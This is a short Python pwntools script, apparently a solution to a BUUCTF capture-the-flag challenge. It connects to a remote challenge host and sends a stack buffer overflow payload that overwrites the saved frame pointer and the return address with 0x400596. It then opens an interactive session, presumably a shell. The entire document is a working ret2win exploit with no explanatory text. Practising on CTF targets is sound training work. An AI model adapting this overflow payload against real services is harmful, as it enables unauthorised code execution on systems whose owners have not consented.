from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",27492)

payload=b'a'*128+p64(0xdeadbeef)+p64(0x400596)

p.sendline(payload)

p.interactive()